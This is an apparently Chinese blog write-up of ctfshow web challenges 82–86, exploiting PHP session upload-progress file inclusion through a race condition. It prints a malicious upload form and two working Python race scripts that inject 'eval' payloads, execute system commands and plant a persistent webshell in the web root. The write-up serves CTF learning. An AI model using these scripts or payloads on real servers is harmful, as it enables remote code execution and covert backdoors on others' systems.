<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow-web入门-文件包含（web82-web86）条件竞争实现session会话文件包含 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/b1a5529e52beff3a3baf40dfeed7fe02/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="ctfshow-web入门-文件包含（web82-web86）条件竞争实现session会话文件包含">
  <meta property="og:description" content="目录
1、web82
2、web83
3、web84
4、web85
5、web86
1、web82 新增过滤点 . ，查看提示：利用 session 对话进行文件包含，通过条件竞争实现。
条件竞争这个知识点在文件上传、不死马利用与查杀这些里面也会涉及，如果大家不熟悉条件竞争可以先看看我之前的博客在文件上传中的介绍：
wzsc_文件上传（条件竞争）_竞争条件文件上传-CSDN博客
大致说一下这道题的利用点：
我们在 Cookie 里设置了 PHPSESSID=test，PHP 将会在服务器上创建一个文件：/tmp/sess_test，但是对于默认配置 session.upload_progress.cleanup = on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。
首先我们写一个关于这道题的文件上传框：
内容如下：
注意替换为你自己题目的地址，并将文件命名为 .html 后缀，双击即可打开，其中 value=&#34;&lt;?php system(&#39;ls&#39;); ?&gt;&#34; 其实就是我们的 payload，即我们希望执行的恶意代码。
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&#34;https://84202b35-60d0-4bd2-bee2-781631694f2c.challenge.ctf.show//&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt; &lt;input type=&#34;hidden&#34; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34; value=&#34;&lt;?php system(&#39;ls&#39;); ?&gt;&#34; /&gt; &lt;input type=&#34;file&#34; name=&#34;file&#34; /&gt; &lt;input type=&#34;submit&#34; value=&#34;submit&#34; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php session_start(); ?&gt; 双击打开页面，开启 burpsuite 拦截本地请求，随便选一个文件上传提交：
使用 burpsuite 抓包，抓到后发给攻击模块：">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-07-05T16:48:58+08:00">
    <meta property="article:modified_time" content="2024-07-05T16:48:58+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow-web入门-文件包含（web82-web86）条件竞争实现session会话文件包含</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:0px;"></p> 
<p id="1%E3%80%81web82-toc" style="margin-left:0px;"><a href="#1%E3%80%81web82" rel="nofollow">1、web82</a></p> 
<p id="2%E3%80%81web83-toc" style="margin-left:0px;"><a href="#2%E3%80%81web83" rel="nofollow">2、web83</a></p> 
<p id="3%E3%80%81web84-toc" style="margin-left:0px;"><a href="#3%E3%80%81web84" rel="nofollow">3、web84</a></p> 
<p id="4%E3%80%81web85-toc" style="margin-left:0px;"><a href="#4%E3%80%81web85" rel="nofollow">4、web85</a></p> 
<p id="5%E3%80%81web86-toc" style="margin-left:0px;"><a href="#5%E3%80%81web86" rel="nofollow">5、web86</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="1%E3%80%81web82">1、web82</h2> 
<p><img alt="" height="523" src="https://images2.imgbox.com/62/4e/h27kaTad_o.png" width="1072"></p> 
<p>新增过滤点 . ，查看提示：利用 session 对话进行文件包含，通过条件竞争实现。</p> 
<p>条件竞争这个知识点在文件上传、不死马利用与查杀这些里面也会涉及，如果大家不熟悉条件竞争可以先看看我之前的博客在文件上传中的介绍：</p> 
<p><a href="https://myon6.blog.csdn.net/article/details/133562672" rel="nofollow" title="wzsc_文件上传（条件竞争）_竞争条件文件上传-CSDN博客">wzsc_文件上传（条件竞争）_竞争条件文件上传-CSDN博客</a></p> 
<p><strong>大致说一下这道题的利用点：</strong></p> 
<p><strong>我们在 Cookie 里设置了 PHPSESSID=test，PHP 将会在服务器上创建一个文件：/tmp/sess_test，但是对于默认配置 session.upload_progress.cleanup = on，文件上传后 session 文件内容会立即被清空，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session 文件内容前，成功访问包含到该文件，实现恶意代码的命令执行。</strong></p> 
<p>首先我们写一个关于这道题的文件上传框：</p> 
<p><img alt="" height="435" src="https://images2.imgbox.com/a3/68/8ObwHu7k_o.png" width="1200"></p> 
<p>内容如下：</p> 
<p>注意替换为你自己题目的地址，并将文件命名为 .html 后缀，双击即可打开，其中 value="&lt;?php system('ls'); ?&gt;" 其实就是我们的 payload，即我们希望执行的恶意代码。</p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
&lt;form action="https://84202b35-60d0-4bd2-bee2-781631694f2c.challenge.ctf.show//" method="POST" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="&lt;?php system('ls'); ?&gt;" /&gt;
&lt;input type="file" name="file" /&gt;
&lt;input type="submit" value="submit" /&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
session_start();
?&gt;
</code></pre> 
<p>双击打开页面，开启 burpsuite 拦截本地请求，随便选一个文件上传提交：</p> 
<p><img alt="" height="178" src="https://images2.imgbox.com/3a/24/brgnikWP_o.png" width="832"></p> 
<p>使用 burpsuite 抓包，抓到后发给攻击模块：</p> 
<p><img alt="" height="641" src="https://images2.imgbox.com/fe/c4/y7pgETdt_o.png" width="1200"></p> 
<p>按照前面说的利用点，我们需要对 Cookie 进行添加：PHPSESSID=exp（可以自定义的）</p> 
<p><img alt="" height="551" src="https://images2.imgbox.com/d9/68/6luNhqcP_o.png" width="1200"></p> 
<p>接下来就是条件竞争的设置，这里不涉及什么参数的爆破，因此清空掉 $</p> 
<p><img alt="" height="255" src="https://images2.imgbox.com/13/06/Ay032Dko_o.png" width="540"></p> 
<p><strong>payload 选择 null</strong>（也就是没有），并且<strong>勾选上无限重复</strong></p> 
<p><img alt="" height="391" src="https://images2.imgbox.com/e5/4e/HEhoDsFF_o.png" width="743"></p> 
<p>我之前的 burpsuite 有一个选项里面可以设置线程数：</p> 
<p><img alt="" height="574" src="https://images2.imgbox.com/23/53/TDC9QC0q_o.png" width="826"></p> 
<p>现在用的这个 burpsuite 有点不一样，应该是这里：</p> 
<p>目前我们设置的是上传包的线程数，这里以 30 为例</p> 
<p><img alt="" height="620" src="https://images2.imgbox.com/ef/45/N2tX93JI_o.png" width="878"></p> 
<p>之后开始攻击，我们就会不断的上传一个包含了恶意代码的文件</p> 
<p>回到题目所在页面，我们需要再抓一个访问包，访问的文件是上面我们自定义的，我这里是：</p> 
<pre><code class="language-html">?file=/tmp/sess_exp</code></pre> 
<p>因为我们前面也说了，我们在 Cookie 里设置了 PHPSESSID=test，PHP 将会在服务器上创建一个文件：/tmp/sess_test。</p> 
<p>使用 burpsuite 抓包：</p> 
<p><img alt="" height="650" src="https://images2.imgbox.com/ef/38/0rplSQp2_o.png" width="1200"></p> 
<p>同样清空掉 $，payload 设置为 null，勾上无限重复：</p> 
<p><img alt="" height="631" src="https://images2.imgbox.com/63/ec/rPZvDyWr_o.png" width="896"></p> 
<p>特别注意一点，<strong>访问包的线程数需要大于上传包的线程数</strong>，这里以 80 为例：</p> 
<p><img alt="" height="597" src="https://images2.imgbox.com/ed/fd/ieRNIxhN_o.png" width="874"></p> 
<p>之后也开始攻击，我们就会不断去访问是否存在文件 /tmp/sess_exp</p> 
<p><strong>一旦在服务器还未来得及删除我们上传的文件，而被我们成功访问时，根据题目的 php 代码，就会将该文件包含，进而执行我们的恶意代码。</strong></p> 
<p>一边不停地上传，一边不停地访问，之所以可以访问到，是因为我们访问的线程数更大：</p> 
<p><img alt="" height="912" src="https://images2.imgbox.com/71/9a/euHyvoA4_o.png" width="1200"></p> 
<p>过一会筛选长度，即可发现条件竞争成功的包：</p> 
<p><img alt="" height="633" src="https://images2.imgbox.com/fb/60/3cPq719W_o.png" width="1200"></p> 
<p>ls 命令执行成功</p> 
<p><img alt="" height="554" src="https://images2.imgbox.com/df/9c/Cjd1YXt9_o.png" width="956"></p> 
<p>修改上传包的 payload，读取 fl0g.php：</p> 
<p><img alt="" height="590" src="https://images2.imgbox.com/6e/34/L7yWmqc6_o.png" width="1119"></p> 
<p>条件竞争成功：</p> 
<p><img alt="" height="905" src="https://images2.imgbox.com/a3/b2/mnPvCSOM_o.png" width="1200"></p> 
<p>拿到 flag：ctfshow{fb4d01d5-8eea-4f79-9d9a-05db3a7d0c9c}</p> 
<p>在网上也找到了这类题的攻击脚本：</p> 
<p>竞争成功写入一句话木马</p> 
<pre><code class="language-python">import requests
import io
import threading


url='https://84202b35-60d0-4bd2-bee2-781631694f2c.challenge.ctf.show/'
sessionid='ctfshow'
data={
	"1":"file_put_contents('/var/www/html/muma.php','&lt;?php eval($_POST[a]);?&gt;');"
}  

'''
post 传递内容可在网站目录下写入一句话木马。
根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
sessionid 可控，所以这里即 /tmp/sess_ctfshow。
这样一旦访问成功，就说明木马植入了
'''


# /tmp/sess_sessionid 中写入一句话木马。
def write(session):  
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(
			url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?&gt;'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)


# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。
def read(session):
	while True:
		response=session.post(
			url+'?file=/tmp/sess_'+sessionid,
	        data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		# 访问木马文件，如果访问到了就代表竞争成功
		resposne2=session.get(url+'muma.php')
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	# 写入和访问分别设置 5 个线程。
	with requests.session() as session:
		for i in range(5):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(5):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()
</code></pre> 
<p>运行看到  ++++++done++++++ 之后说明木马写入成功</p> 
<p><img alt="" height="910" src="https://images2.imgbox.com/09/ff/FB5gxNmG_o.png" width="1200"></p> 
<p>访问 muma.php 并调用：</p> 
<pre><code class="language-python">a=system('ls');</code></pre> 
<p>可以看到我们写入的木马，就在当前目录</p> 
<p><img alt="" height="764" src="https://images2.imgbox.com/06/6a/gnL7Pb9H_o.png" width="1200"></p> 
<p>读取 flag：</p> 
<pre><code class="language-python">a=system('tac fl0g.php');</code></pre> 
<p><img alt="" height="764" src="https://images2.imgbox.com/54/1e/J5stfpBd_o.png" width="1200"></p> 
<p></p> 
<h2 id="2%E3%80%81web83">2、web83</h2> 
<p><img alt="" height="546" src="https://images2.imgbox.com/64/61/1hwW98la_o.png" width="1200"></p> 
<p>新增两个函数：</p> 
<pre><code class="language-python">session_unset();
session_destroy();
</code></pre> 
<p>两者都是 PHP 中与会话（session）管理相关的函数，用于清除和销毁会话数据。</p> 
<p>session_unset():</p> 
<p>作用: 清空当前会话中的所有变量。</p> 
<p>使用场景: 当你希望保留会话但清除会话中的数据时使用。例如，你可能想让用户保持登录状态，但重置会话中的特定数据。</p> 
<p>示例:</p> 
<pre><code class="language-php">session_start(); // 开始会话
$_SESSION['username'] = 'John'; // 设置会话变量
session_unset(); // 清空所有会话变量
echo isset($_SESSION['username']); // 输出: bool(false)</code></pre> 
<p>session_destroy():</p> 
<p>作用: 完全销毁会话，包括会话数据和会话ID。</p> 
<p>使用场景: 当你希望用户完全登出或结束会话时使用。例如，用户点击“注销”按钮时，通常会调用此函数。</p> 
<p>示例:</p> 
<pre><code class="language-php">session_start(); // 开始会话
$_SESSION['username'] = 'John'; // 设置会话变量
session_destroy(); // 销毁会话
echo isset($_SESSION['username']); // 输出: bool(false)</code></pre> 
<p>总结：</p> 
<p>session_unset()只是清空会话变量，但会话仍然存在。<br> session_destroy()完全销毁会话，包括会话数据和会话ID。<br> 两者常常一起使用，以确保会话数据被清除，并确保会话本身被销毁：</p> 
<pre><code class="language-php">session_start(); // 开始会话
session_unset(); // 清空所有会话变量
session_destroy(); // 销毁会话</code></pre> 
<p>这两个函数对于我们这里的条件竞争影响不大，在第一题中我们已经介绍过利用的原理了，因此后面我就不再演示手动的步骤，直接使用脚本来打。</p> 
<p>这里给到另一个脚本，我们直接执行命令：</p> 
<pre><code class="language-python">#coding=utf-8

import io
import requests
import threading
sessid = 'exp'
data = {"cmd":"system('whoami');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'https://ff5baee2-33e9-4249-8188-b79f81296793.challenge.ctf.show/', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST["cmd"]);?&gt;'}, files={'file': ('test.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('https://ff5baee2-33e9-4249-8188-b79f81296793.challenge.ctf.show/?file=/tmp/sess_'+sessid,data=data)
        if 'test.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()</code></pre> 
<p>运行脚本，whoami 命令执行成功 </p> 
<p><img alt="" height="772" src="https://images2.imgbox.com/62/cf/r4Np8kla_o.png" width="1200"></p> 
<p>接下来我们执行 ls 命令：</p> 
<p>存在 fl0g.php</p> 
<p><img alt="" height="798" src="https://images2.imgbox.com/32/c4/BKe1iGCF_o.png" width="1200"></p> 
<p>读取 flag：</p> 
<p><img alt="" height="806" src="https://images2.imgbox.com/fb/42/0nscOPn7_o.png" width="1200"></p> 
<p>拿到 flag：ctfshow{b4f6c4ae-24c3-4bdf-b0cb-02d44a71069e}</p> 
<p> </p> 
<h2 id="3%E3%80%81web84">3、web84</h2> 
<p><img alt="" height="546" src="https://images2.imgbox.com/7b/c8/8ob0PazI_o.png" width="1088"></p> 
<p>新增  system("rm -rf /tmp/*"); 删除我们上传的文件，其实 session.upload_progress.cleanup = on 本身就会进行清空，所以这里对我们利用影响不大。</p> 
<p>改一下题目地址继续读 flag：</p> 
<p><img alt="" height="790" src="https://images2.imgbox.com/ca/42/xfSt7bHp_o.png" width="1200"></p> 
<p>拿到 flag：ctfshow{06f54734-37c6-4b2e-b9da-37df8d66555f}</p> 
<p></p> 
<h2 id="4%E3%80%81web85">4、web85</h2> 
<p><img alt="" height="667" src="https://images2.imgbox.com/ba/2a/B1dAKftR_o.png" width="1095"></p> 
<p>新增：</p> 
<pre><code class="language-php">    if(file_exists($file)){
        $content = file_get_contents($file);
        if(strpos($content, "&lt;")&gt;0){
            die("error");
        }</code></pre> 
<p> file_get_contents 函数将会读取文件的全部内容并将其作为字符串返回，strpos($content, "&lt;") 查找字符串 $content 中首次出现字符 &lt; 的位置，如果其位置索引大于 0，则会停止执行并输出 error 信息。</p> 
<p>对我们条件竞争不影响，沿用上面的脚本：</p> 
<p><img alt="" height="822" src="https://images2.imgbox.com/c8/13/DKkodwty_o.png" width="1200"></p> 
<p>拿到 flag：ctfshow{44cafdd4-f08a-483d-af45-19ed3229dd81}</p> 
<p></p> 
<h2 id="5%E3%80%81web86">5、web86</h2> 
<p><img alt="" height="566" src="https://images2.imgbox.com/75/81/QPPHWGVE_o.png" width="976"></p> 
<p>新增：</p> 
<pre><code class="language-php">define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);</code></pre> 
<p>代码解释：</p> 
<p>define 函数用于定义一个常量。在这里，它定义了一个名为 还要秀？ 的常量。<br> dirname(__FILE__) 返回当前文件所在的目录路径。__FILE__ 是一个魔术常量，表示当前文件的完整路径和文件名，而 dirname(__FILE__) 则获取当前文件的目录部分。<br> 因此，这行代码将当前文件的目录路径赋值给名为 还要秀？ 的常量。</p> 
<p>set_include_path 函数用于设置 PHP 包含文件的搜索路径，在这里，它将包含路径设置为 还要秀？ 这个常量的值，即当前文件的目录路径。</p> 
<p>设置 PHP 的包含路径为当前文件的目录路径。这样在后续代码中使用 include()  时，可以省略文件的完整路径，只需提供文件名。</p> 
<p>当使用 include()、require()、include_once() 或 require_once() 时，如果提供的路径既不是绝对路径也不是相对路径，PHP 会首先在 include_path 设置的目录中查找文件。</p> 
<p>我们条件竞争进行包含的文件是一个完整路径，即 /tmp/sess_exp，因此不影响：</p> 
<p><img alt="" height="846" src="https://images2.imgbox.com/53/4d/Y1Qj3Rkb_o.png" width="1200"></p> 
<p>拿到 flag：ctfshow{8dc8c8cd-7851-4e2e-9afb-dfba214569d4}</p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e50e12396d067bfc6c8ce2d88c4e0ceb/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">通过 Wi-Fi 在 Android 设备之间传输文件的 5 种简单方法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9c9f59546f9ff58b6bd9eb9f8ba3f1c9/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">六个步骤轻松将网站从Webflow迁移到WordPress</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>